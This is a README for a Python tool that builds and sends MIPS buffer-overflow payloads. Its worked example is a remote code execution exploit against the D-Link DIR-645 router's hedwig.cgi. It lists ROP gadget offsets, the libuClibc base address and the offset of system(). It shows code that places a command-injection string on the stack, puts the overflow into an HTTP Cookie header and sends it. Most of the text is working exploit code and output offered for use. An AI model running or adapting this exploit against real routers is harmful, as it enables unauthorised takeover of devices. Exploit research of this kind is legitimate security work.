# mow
Mips Overflow Writer - Quickly write MIPS big/little endian overflows.

This python file allows the user to quickly generate and send MIPS based overflows. 
Simply have to craft an overflow and send it to the target. 

## Example
This is a quick example showing how to generate an overflow for the D-Link 
DIR-645 against hedwig.cgi. The high level overview is listed on 
[this](https://www.exploit-db.com/exploits/27283) site.

A ROP gadget was built using static analysis of libuClibc.so.1 and its shown below. 
Explaining the gadget is kinda beyond the scope of the readme, but there it is.

```----------------------------------------------------------------
| Gadget Name | Gadget Offset | Gadget Summary                  |
-----------------------------------------------------------------
| rop1        | 0x00057D60    | addiu   $s0, 8                  |
|             |               | sll     $a0, 3                  |
|             |               | addu    $a0, $s2, $a0           |
|             |               | move    $a1, $s0                |
|             |               | move    $t9, $s1                |
|             |               | jalr    $t9                     |
|             |               | li      $a2, 8                  |
-----------------------------------------------------------------
| rop2        | 0x00015B6C    | addiu   $s2, $sp, 0x2A8+var_290 |
|             |               | move    $a2, $v1                |
|             |               | move    $t9, $s0                |
|             |               | jalr    $t9                     |
|             |               | move    $a0, $s2                |
-----------------------------------------------------------------
```

Other value of importance found through analysis are:

- Base of libuClibc loaded in memory: 0x2aaf8000

- Distance to registers from overflow buffer: 0x400

- Offset to System in libuClibc: 0x53200 (ending 0x00 is the reason for the first gadget, cant send that across.)

- Registers used in function: s0 through s7, including fp. (8 registers)

### Generating the Overflow
```bash
>>> import mow
>>> overflow = mow.Overflow(0x400, 8, mow.LITTLE_ENDIAN, 0, 0x2aaf8000, '/runtime/session/')
>>> overflow.s0 = 0x531f8
>>> overflow.s1 = 0x15b6c
>>> overflow.ra = 0x57d60
>>> overflow.add_to_stack(0x18, command='touch${IFS}/tmp/filename&')
>>> of_string = overflow.generate()
********************
Overflow Generation
********************
Bytes to first register: 0x03ef(1007) accounting for 17 bytes in the string: /runtime/session/
s0 = 0xf8b1b42a (0x2aaf8000 + 0x531f8)
s1 = 0x6cdbb02a (0x2aaf8000 + 0x15b6c)
s2 = 0x43434343
s3 = 0x44444444
s4 = 0x45454545
s5 = 0x46464646
s6 = 0x47474747
s7 = 0x48484848
ra = 0x60fdb42a (0x2aaf8000 + 0x57d60)
stack = b'XXXXXXXXXXXXXXXXXXXXXXXXtouch${IFS}/tmp/filename&'
********************
```

### Creating the Packet 

```bash
>>> request = mow.CustomRequest('127.0.0.1', 80, mow.POST, 'hedwig.cgi', {'Cookie': b'uid=%s' % of_string}, 'doesntmatter')
>>> packet = request.create_packet()
********************
Packet Generation
********************
POST /hedwig.cgi HTTP/1.1
Host: 127.0.0.1:80
Cookie: uid=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX*l۰*CCCCDDDDEEEEFFFFGGGGHHHH`*XXXXXXXXXXXXXXXXXXXXXXXXtouch${IFS}/tmp/filename&
Content-Length: 12

doesntmatter
********************
```

### Sending the Packet

```bash
mow.send_packet('127.0.0.1', 80, packet)
```

### Future Work
I plan to eventually add more functionality, but only as it comes up so the updates
might be a little slow.
